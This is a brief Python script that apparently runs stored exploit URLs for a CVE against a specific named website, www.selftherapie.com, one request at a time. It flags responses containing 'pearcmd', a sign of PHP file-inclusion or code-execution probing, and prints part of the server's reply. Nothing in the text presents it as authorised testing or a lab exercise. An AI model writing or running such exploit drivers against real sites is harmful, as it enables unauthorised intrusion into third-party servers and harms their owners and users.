import json
from core import http, vuln
v = vuln.load("CVE-2026-87902")
base = "https://www.selftherapie.com"
for u in v["exploit"]["urls"]:
    http.drop("www.selftherapie.com")
    try:
        r = http.request("www.selftherapie.com", u, tries=1)
    except Exception as e:
        print("EXC", type(e).__name__, u); continue
    t = r.text or ""
    print(r.status_code, len(t), "pear:", "pearcmd" in t, "|", u)
    if "pearcmd" in t:
        print("   >>>", t[:200].replace("\n", " "))